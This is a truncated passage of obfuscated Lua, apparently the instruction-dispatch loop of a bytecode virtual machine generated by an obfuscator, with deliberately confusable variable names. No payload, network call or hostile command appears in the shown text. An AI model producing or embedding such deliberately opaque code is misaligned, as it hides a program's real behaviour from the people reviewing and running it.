snap_lIIlIIIllIIlIIIlI=snap_lIIlIIIllIIlIIIlI+1;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]=snap_IlIllIllIIlll[snap_lIIlIIIllIIlIIIlI];end;snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_IIIllIIIlllIIlIlll))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[3];end;elseif snap_lIIlIIIllIIlIIIlI<=23 then if snap_lIIlIIIllIIlIIIlI>22 then if snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]then snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;else snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[3];end;else snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IlllllIlIIIIIIIlll(snap_IlIllIlllIIllI[snap_llIIlIlIlIllIlIl[3]],nil,snap_IIIlllIIIIIlIllllII);end;elseif snap_lIIlIIIllIIlIIIlI<=24 then do return end;elseif snap_lIIlIIIllIIlIIIlI==25 then local snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[2]local snap_IlIlIIlIlIllIllIl,snap_llIIlIlIlIllIlIl=snap_IIIIlllIllllIIIIIlIll(snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl+1,snap_llIIlIlIlIllIlIl[3])))snap_IIIllIIIlllIIlIlll=snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl-1 local snap_llIIlIlIlIllIlIl=0;for snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl,snap_IIIllIIIlllIIlIlll do snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+1;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl]=snap_IlIlIIlIlIllIllIl[snap_llIIlIlIlIllIlIl];end;else local snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[2];local snap_IlIlIIlIlIllIllIl=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl+1]=snap_IlIlIIlIlIllIllIl;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl]=snap_IlIlIIlIlIllIllIl[snap_llIIlIlIlIllIlIl[4]];end;elseif snap_lIIlIIIllIIlIIIlI<=31 then if snap_lIIlIIIllIIlIIIlI<=28 then if snap_lIIlIIIllIIlIIIlI>27 then local snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl]()else local snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[2]local snap_IlIlIIlIlIllIllIl,snap_llIIlIlIlIllIlIl=snap_IIIIlllIllllIIIIIlIll(snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_llIIlIIlIlIllIl+1,snap_llIIlIlIlIllIlIl[3])))snap_IIIllIIIlllIIlIlll=snap_llIIlIlIlIllIlIl+snap_llIIlIIlIlIllIl-1 local snap_llIIlIlIlIllIlIl=0;for snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl,snap_IIIllIIIlllIIlIlll do snap_llIIlIlIlIllIlIl=snap_llIIlIlIlIllIlIl+1;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIIlIlIllIl]=snap_IlIlIIlIlIllIllIl[snap_llIIlIlIlIllIlIl];end;end;elseif snap_lIIlIIIllIIlIIIlI<=29 then snap_llIIlIIlIlIllIl=snap_llIIlIlIlIllIlIl[3];elseif snap_lIIlIIIllIIlIIIlI>30 then snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]];else local snap_IIllIlIllIIlIlIIII;snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII+1])snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_IIllIlIllIIlIlIIII=snap_llIIlIlIlIllIlIl[2]snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_IIllIlIllIIlIlIIII](snap_lllIllIIlIIIIlIllIlllIlI(snap_lIllIlIIIllIIIllIlIlllIlI,snap_IIllIlIllIIlIlIIII+1,snap_llIIlIlIlIllIlIl[3]))snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]][snap_llIIlIlIlIllIlIl[3]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_IIIlllIIIIIlIllllII[snap_llIIlIlIlIllIlIl[3]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[3]][snap_llIIlIlIlIllIlIl[4]];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllIl+1;snap_llIIlIlIlIllIlIl=snap_IlIlIIlIlIllIllIl[snap_llIIlIIlIlIllIl];snap_lIllIlIIIllIIIllIlIlllIlI[snap_llIIlIlIlIllIlIl[2]]=snap_llIIlIlIlIllIlIl[3];snap_llIIlIIlIlIllIl=snap_llIIlIIlIlIllI